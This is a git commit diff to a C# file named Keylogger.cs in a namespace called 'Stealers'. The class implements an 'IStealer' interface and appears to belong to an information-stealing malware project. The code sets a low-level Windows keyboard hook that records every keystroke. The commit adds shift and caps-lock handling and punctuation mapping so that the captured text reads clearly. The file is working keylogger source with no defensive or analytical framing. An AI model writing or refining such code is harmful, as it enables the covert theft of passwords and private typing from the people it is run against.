ad819f53f6503e1f99c6a4eb0f5851bd0af16a5e
unknown <AJ@.(none)>
2011-04-03 15:23:26 -0700

    Updated keyparsing to make the text readable

--- sub/Stealers/Keylogger.cs
+++ sub/Stealers/Keylogger.cs
@@ -8,10 +8,11 @@ namespace sub.Stealers
 {
     internal class Keylogger : IStealer
     {
-        #region Declarations
+        #region Keyboard Hooks
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
+        private const int WM_KEYUP = 0x0101;
         private LowLevelKeyboardProc _proc;
         private IntPtr _hookID = IntPtr.Zero;
 
@@ -30,10 +31,6 @@ namespace sub.Stealers
         [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
-        #endregion
-
-        #region Keyboard Hooks
-
         private IntPtr SetHook(LowLevelKeyboardProc proc)
         {
             using (Process curProcess = Process.GetCurrentProcess())
@@ -50,9 +47,16 @@ namespace sub.Stealers
         private IntPtr HookCallback(
             int nCode, IntPtr wParam, IntPtr lParam)
         {
-            if (nCode >= 0 && wParam == (IntPtr) WM_KEYDOWN)
+            if (nCode >= 0)
             {
-                ProcessChar(Marshal.ReadInt32(lParam));
+                if (wParam == (IntPtr) WM_KEYDOWN)
+                {
+                    ProcessKeyDown(Marshal.ReadInt32(lParam));
+                }
+                else if (wParam == (IntPtr) WM_KEYUP)
+                {
+                    ProcessKeyUp(Marshal.ReadInt32(lParam));
+                }
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
@@ -61,9 +65,14 @@ namespace sub.Stealers
 
         public string Data { get; set; }
 
+        private bool _shift;
+        private bool _capslock;
+
         public Keylogger()
         {
             _proc = HookCallback;
+            _shift = false;
+            _capslock = false;
         }
 
         public void Collect()
@@ -73,17 +82,145 @@ namespace sub.Stealers
             UnhookWindowsHookEx(_hookID);
         }
 
-        private void ProcessChar(int code)
+        private void ProcessKeyDown(int code)
         {
-            switch (code)
+            if (code >= 65 && code <= 90)
             {
-                case 32:
-                    Data += "[Space]";
-                    break;
-                default:
-                    Data += (Keys) code;
-                    break;
+                Data += (_shift ^ _capslock) ? ((Keys) code).ToString() : ((Keys) code).ToString().ToLower();
             }
+            else
+            {
+                switch (code)
+                {
+                    case 8:
+                        Data += "[Backspace]";
+                        break;
+                    case 20:
+                        _capslock = !_capslock;
+                        break;
+                    case 32:
+                        Data += " ";
+                        break;
+                    case 48:
+                        Data += _shift ? ")" : "0";
+                        break;
+                    case 49:
+                        Data += _shift ? "!" : "1";
+                        break;
+                    case 50:
+                        Data += _shift ? "@" : "2";
+                        break;
+                    case 51:
+                        Data += _shift ? "#" : "3";
+                        break;
+                    case 52:
+                        Data += _shift ? "$" : "4";
+                        break;
+                    case 53:
+                        Data += _shift ? "%" : "5";
+                        break;
+                    case 54:
+                        Data += _shift ? "^" : "6";
+                        break;
+                    case 55:
+                        Data += _shift ? "&" : "7";
+                        break;
+                    case 56:
+                        Data += _shift ? "*" : "8";
+                        break;
+                    case 57:
+                        Data += _shift ? "(" : "9";
+                        break;
+                    case 96:
+                        Data += "0";
+                        break;
+                    case 97:
+                        Data += "1";
+                        break;
+                    case 98:
+                        Data += "2";
+                        break;
+                    case 99:
+                        Data += "3";
+                        break;
+                    case 100:
+                        Data += "4";
+                        break;
+                    case 101:
+                        Data += "5";
+                        break;
+                    case 102:
+                        Data += "6";
+                        break;
+                    case 103:
+                        Data += "7";
+                        break;
+                    case 104:
+                        Data += "8";
+                        break;
+                    case 105:
+                        Data += "9";
+                        break;
+                    case 160:
+                        _shift = true;
+                        break;
+                    case 161:
+                        _shift = true;
+                        break;
+                    case 186:
+                        Data += _shift ? ":" : ";";
+                        break;
+                    case 187:
+                        Data += _shift ? "+" : "=";
+                        break;
+                    case 188:
+                        Data += _shift ? "<" : ",";
+                        break;
+                    case 189:
+                        Data += _shift ? "_" : "-";
+                        break;
+                    case 190:
+                        Data += _shift ? ">" : ".";
+                        break;
+                    case 191:
+                        Data += _shift ? "?" : "/";
+                        break;
+                    case 192:
+                        Data += _shift ? "~" : "`";
+                        break;
+                    case 219:
+                        Data += _shift ? "{" : "[";
+                        break;
+                    case 220:
+                        Data += _shift ? "|" : "\\";
+                        break;
+                    case 221:
+                        Data += _shift ? "}" : "]";
+                        break;
+                    case 222:
+                        Data += _shift ? "\"" : "'";
+                        break;
+                    default:
+                        Data += "[" + (Keys) code + "]";
+                        break;
+                }
+            }
+        }
+
+        private void ProcessKeyUp(int code)
+        {
+            //Console.WriteLine(code);
+            /*switch (code)
+            {
+                case 160:
+                    _shift = false;
+                    break;
+                case 161:
+                    _shift = false;
+                    break;
+            }*/
+            if (code == 160 || code == 161)
+                _shift = false;
         }
     }
 }
